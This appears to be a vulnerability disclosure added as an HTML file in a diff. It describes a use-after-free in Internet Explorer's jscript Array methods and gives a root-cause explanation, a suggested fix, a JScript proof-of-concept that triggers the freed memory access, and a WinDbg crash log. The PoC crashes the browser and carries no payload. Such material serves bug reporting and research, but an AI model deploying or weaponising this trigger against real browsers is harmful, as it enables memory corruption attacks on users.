@@ -1,0 +1,124 @@
+<!--
+There are multiple use-after-free issues in Array methods in jscript. When jscript executes an Array method (such as Array.join), it first retrieves the length of an array. If the input is not an array but an object, then the length property of the object is going to be retrieved and converted to scalar. During this conversion, the "length" property is not going to be tracked by the garbage collector and the conversion to scalar causes toString()/valueOf() callbacks to be triggered. Thus, during these callbacks, the "length" property could be freed and then the freed memory can be referenced by accessing the "this" variable inside the toString()/valueOf() function.
+
+All of the Array methods exhibit this pattern (see the PoC).
+
+Due to the specifics of how jscript implements variable, this will only result in the crash if the entire memory block that holds the "this" variable gets freed. This is why the PoC uses an object with a large number of elements in addition to the "length" element.
+
+As with the other use-after-free issues I reported recently that result in garbage-collecting the "this" variable, I believe the correct way to fix this is to always put the "this" VAR on the garbage collector root list before any function gets called, instead of attempting to fix each affected function individually.
+
+PoC for IE (note: The PoC has been tested on Windows 7 64-bit in IE 11.0.50 with 64-bit tab process and with Page Heap enabled):
+
+============================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+var vars = {};
+
+function f() {
+  alert('in f');
+  for(var i=0; i<40000; i++) {
+    vars[i] = 1;
+  }
+  vars.length = 0;
+  CollectGarbage();
+  alert(this);
+}
+
+for(var i=0; i<20000; i++) {
+  vars[i] = [];
+}
+vars.length = [];
+for(var i=20000; i<40000; i++) {
+  vars[i] = [];
+}
+
+vars.length.toString = f;
+
+// all of these work, just uncomment the one you want to test
+//Array.prototype.join.call(vars);
+//Array.prototype.reverse.call(vars);
+//Array.prototype.sort.call(vars);
+//Array.prototype.pop.call(vars);
+//Array.prototype.push.call(vars, 1);
+//Array.prototype.shift.call(vars);
+//Array.prototype.unshift.call(vars, 1);
+//Array.prototype.slice.call(vars, 1);
+Array.prototype.splice.call(vars, 1, 1);
+
+alert('failed');
+
+</script>
+
+<!--
+============================================
+
+Debug log:
+
+============================================
+
+(e7c.54c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!ConvertToObject+0x2f:
+000007fe`f7eb06cf 0fb70a          movzx   ecx,word ptr [rdx] ds:00000000`2115eee0=????
+
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`10ed8a10 000007fe`f7eb0684 jscript!ConvertToObject+0x2f
+01 00000000`10ed8a90 000007fe`f7eb0fa9 jscript!CScriptRuntime::InitThis+0x81
+02 00000000`10ed8ac0 000007fe`f7e88ec2 jscript!CScriptRuntime::Run+0x3b0d
+03 00000000`10ed98c0 000007fe`f7e88d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+04 00000000`10ed9ad0 000007fe`f7eb1e34 jscript!ScrFncObj::Call+0xb7
+05 00000000`10ed9b70 000007fe`f7e886ea jscript!NameTbl::InvokeInternal+0x60f
+06 00000000`10ed9c90 000007fe`f7efa368 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+07 00000000`10ed9ce0 000007fe`f7ebcd77 jscript!NameTbl::GetValDef+0xf8
+08 00000000`10ed9d70 000007fe`f7e8de69 jscript!NameTbl::InvokeInternal+0xb07
+09 00000000`10ed9e90 000007fe`f7ea4b44 jscript!VAR::GetValue+0xa1
+0a 00000000`10ed9ee0 000007fe`f7eecd5e jscript!ConvertToScalar+0x60
+0b 00000000`10ed9f50 000007fe`f7e8c2dc jscript!JsArraySplice+0x11e
+0c 00000000`10eda050 000007fe`f7e8a9fe jscript!NatFncObj::Call+0x138
+0d 00000000`10eda100 000007fe`f7e886ea jscript!NameTbl::InvokeInternal+0x3f8
+0e 00000000`10eda220 000007fe`f7eddb82 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+0f 00000000`10eda270 000007fe`f7e8c2dc jscript!JsFncCall+0xc2
+10 00000000`10eda300 000007fe`f7e8a9fe jscript!NatFncObj::Call+0x138
+11 00000000`10eda3b0 000007fe`f7e8b234 jscript!NameTbl::InvokeInternal+0x3f8
+12 00000000`10eda4d0 000007fe`f7e89852 jscript!VAR::InvokeByName+0x81c
+13 00000000`10eda6e0 000007fe`f7e89929 jscript!VAR::InvokeDispName+0x72
+14 00000000`10eda760 000007fe`f7e824b8 jscript!VAR::InvokeByDispID+0x1229
+15 00000000`10eda7b0 000007fe`f7e88ec2 jscript!CScriptRuntime::Run+0x5a6
+16 00000000`10edb5b0 000007fe`f7e88d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+17 00000000`10edb7c0 000007fe`f7e88b95 jscript!ScrFncObj::Call+0xb7
+18 00000000`10edb860 000007fe`f7e8e6c0 jscript!CSession::Execute+0x19e
+19 00000000`10edb930 000007fe`f7e970e7 jscript!COleScript::ExecutePendingScripts+0x17a
+1a 00000000`10edba00 000007fe`f7e968d6 jscript!COleScript::ParseScriptTextCore+0x267
+1b 00000000`10edbaf0 000007fe`ebf86151 jscript!COleScript::ParseScriptText+0x56
+1c 00000000`10edbb50 000007fe`ec6db3a4 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+1d 00000000`10edbbd0 000007fe`ebf8715e MSHTML!CScriptCollection::ParseScriptText+0x37f
+1e 00000000`10edbcb0 000007fe`ebf86b71 MSHTML!CScriptData::CommitCode+0x3d9
+1f 00000000`10edbe80 000007fe`ebf86901 MSHTML!CScriptData::Execute+0x283
+20 00000000`10edbf40 000007fe`ec733559 MSHTML!CHtmScriptParseCtx::Execute+0x101
+21 00000000`10edbf80 000007fe`ec0673da MSHTML!CHtmParseBase::Execute+0x235
+22 00000000`10edc020 000007fe`ec01b689 MSHTML!CHtmPost::Broadcast+0x90
+23 00000000`10edc060 000007fe`ebf5742f MSHTML!CHtmPost::Exec+0x4bb
+24 00000000`10edc270 000007fe`ebf57380 MSHTML!CHtmPost::Run+0x3f
+25 00000000`10edc2a0 000007fe`ebf58d0c MSHTML!PostManExecute+0x70
+26 00000000`10edc320 000007fe`ebf5b293 MSHTML!PostManResume+0xa1
+27 00000000`10edc360 000007fe`ebf75dcc MSHTML!CHtmPost::OnDwnChanCallback+0x43
+28 00000000`10edc3b0 000007fe`ec77db35 MSHTML!CDwnChan::OnMethodCall+0x41
+29 00000000`10edc3e0 000007fe`ebe79d85 MSHTML!GlobalWndOnMethodCall+0x240
+2a 00000000`10edc480 00000000`774f9bbd MSHTML!GlobalWndProc+0x150
+2b 00000000`10edc500 00000000`774f98c2 USER32!UserCallWinProcCheckWow+0x1ad
+2c 00000000`10edc5c0 000007fe`f274305c USER32!DispatchMessageWorker+0x3b5
+2d 00000000`10edc640 000007fe`f26ffa9b IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+2e 00000000`10edf8c0 000007fe`fe28a2bf IEFRAME!LCIETab_ThreadProc+0x3a3
+2f 00000000`10edf9f0 000007fe`fad7925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+30 00000000`10edfa20 00000000`775f59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+31 00000000`10edfa70 00000000`7772a561 kernel32!BaseThreadInitThunk+0xd
+32 00000000`10edfaa0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+============================================
+-->
